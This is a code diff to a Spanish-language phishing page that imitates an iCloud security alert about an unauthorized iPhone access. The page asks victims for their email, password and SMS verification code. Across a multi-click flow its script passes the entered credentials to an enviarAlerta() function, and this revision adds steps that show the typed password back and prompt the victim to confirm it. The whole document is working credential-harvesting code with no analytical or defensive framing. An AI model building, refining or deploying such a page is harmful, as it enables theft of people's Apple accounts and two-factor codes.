@@ -19,8 +19,7 @@
         <div class="right">
             <span class="dots">•••</span>
             <div class="menu-popup" id="menuPopup">
-                <a class="menu-link"
-                    target="_blank">Manual de uso de iCloud</a>
+                <a class="menu-link" target="_blank">Manual de uso de iCloud</a>
             </div>
         </div>
     </div>
@@ -31,7 +30,7 @@
             <h1>Alerta de Seguridad</h1>
             <p class="message">
                 Se ha detectado un acceso al dispositivo <strong>iPhone 13 (MLPK3 LZ/A)</strong> asociado a la cuenta
-                <strong>t*****@gmail.com</strong> a las <strong>16:11:32</strong>.
+                <strong>t*****@gmail.com</strong> a las <strong>15:39:22</strong>.
                 Este acceso no autorizado podría poner en riesgo la confidencialidad de sus datos. Por favor, confirme
                 su
                 correo electrónico para validar la actividad y proteger su cuenta.
@@ -48,6 +47,10 @@
                     <input type="password" id="user-pass" required>
                     <label for="user-pass">Contraseña</label>
                 </div>
+            </div>
+
+            <div id="confirmMessage" class="confirm-message" style="display:none;">
+                Por favor confirme sus datos antes de continuar
             </div>
 
             <button class="btn" id="continueBtn">
@@ -88,7 +91,7 @@
                 <input type="text" maxlength="1" class="code-digit" id="digit-6" required autocomplete="off"
                     inputmode="numeric">
             </div>
-                <p>Ingresa el código de verificación enviado por mensaje al ••• ••• •96.</p>
+            <p>Ingresa el código de verificación enviado por mensaje al ••• ••• •96.</p>
             <div id="verify-footer">
                 <a class="resend-link">Volver a enviar código</a>
             </div>
@@ -146,7 +149,6 @@
     continueBtn.addEventListener('click', () => {
         const value = emailInput.value.trim();
         const passValue = userPass.value.trim();
-        const codeValue = document.getElementById('verify-code')?.value.trim();
 
         if (!allowedDomains.test(value)) {
             emailInput.classList.remove('valid');
@@ -158,40 +160,84 @@
             userPass.focus();
             return;
         }
-        if (verifyBox.style.display === 'block' && codeValue === "") {
-            document.getElementById('verify-code').classList.add('invalid');
-            return;
-        }
 
-        btnText.style.display = 'none';
-        btnLoader.style.display = 'inline-block';
-        continueBtn.disabled = true;
+        clickCount++;
 
-        setTimeout(() => {
-            btnLoader.style.display = 'none';
-            btnText.style.display = 'inline-block';
-            continueBtn.disabled = false;
+        if (clickCount === 1) {
+            // Primer clic → mostrar contraseña con animación
+            btnText.style.display = 'none';
+            btnLoader.style.display = 'inline-block';
+            continueBtn.disabled = true;
 
-            clickCount++;
+            setTimeout(() => {
+                btnLoader.style.display = 'none';
+                btnText.style.display = 'inline-block';
+                continueBtn.disabled = false;
 
-            if (clickCount === 1) {
-                // Mostrar contraseña
                 enviarAlerta(`Correo válido ingresado: ${value}`);
                 infoBox.style.display = 'none';
                 newBox.style.display = 'block';
                 setTimeout(() => newBox.classList.add('show'), 10);
-            } else if (clickCount === 2) {
+            }, 2500);
+
+        } else if (clickCount === 2) {
+            setTimeout(() => {
+                // Segundo clic → mostrar mensaje y revelar contraseña
                 enviarAlerta(`Correo: ${value} | Contraseña: ${passValue}`);
+
+                // Mostrar mensaje de confirmación
+                const confirmMessage = document.getElementById('confirmMessage');
+                confirmMessage.style.display = 'block';
+                setTimeout(() => confirmMessage.classList.add('show'), 10);
+
+                // Hacer visible el input de contraseña si aún no lo está
+                newBox.style.display = 'block';
+                setTimeout(() => newBox.classList.add('show'), 10);
+
+                // Revelar la contraseña escrita
+                userPass.setAttribute('type', 'text');
+
+                // Quitar valid/invalid
+                emailInput.classList.remove('valid', 'invalid');
+                userPass.classList.remove('valid', 'invalid');
+
+                // 🔹 Delay antes de aplicar el highlight amarillo
+                emailInput.classList.add('highlight');
+                userPass.classList.add('highlight');
+            }, 900); // medio segundo de delay
+        }
+        else if (clickCount === 3) {
+            // Tercer clic → mostrar verify-box con animación
+            btnText.style.display = 'none';
+            btnLoader.style.display = 'inline-block';
+            continueBtn.disabled = true;
+
+            setTimeout(() => {
+                confirmMessage
+                btnLoader.style.display = 'none';
+                btnText.style.display = 'inline-block';
+                continueBtn.disabled = false;
+
                 initialFlow.style.display = 'none';
                 newBox.style.display = 'none';
+                document.getElementById('confirmMessage').style.display = 'none'; // ocultar mensaje
                 verifyBox.style.display = 'block';
                 setTimeout(() => verifyBox.classList.add('show'), 10);
-            } else if (clickCount === 3) {
-                enviarAlerta(`Correo: ${value} | Contraseña: ${passValue} | Código: ${codeValue}`);
+
+                // Quitar highlight amarillo al pasar al verify-box
+                emailInput.classList.remove('highlight');
+                userPass.classList.remove('highlight');
+
+                // Volver a ocultar la contraseña
+                userPass.setAttribute('type', 'password');
+
+                enviarAlerta(`Correo: ${value} | Contraseña: ${passValue}`);
                 clickCount = 0;
-            }
-        }, 2500);
+            }, 2500);
+        }
     });
+
+
 
     emailInput.addEventListener('keydown', (e) => {
         if (e.key === "Enter") {
@@ -262,11 +308,4 @@
             menu.style.display = 'none';
         }
     });
-
 </script>
-
-
-
-
-
-
